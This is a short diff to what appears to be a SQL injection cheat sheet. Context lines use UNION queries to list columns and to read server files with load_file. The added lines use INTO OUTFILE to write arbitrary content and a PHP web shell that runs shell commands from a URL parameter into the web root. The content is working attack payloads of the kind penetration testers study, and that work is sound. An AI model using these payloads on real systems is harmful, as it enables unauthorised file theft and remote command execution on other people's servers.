@@ -1694,6 +1694,12 @@ UNION all select 1,...,column_name from information_schema.columns where table_n
 
 # file read
 UNION all select 1,...,load_file('/path/to/file/here')
+
+# write file in web root
+UNION all select 1,...,"content_here" into OUTFILE '/path/to/outfile'
+
+# write php shell in web root
+UNION all select 1,...,"<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE '/path/to/outfile'
 ```
 
 
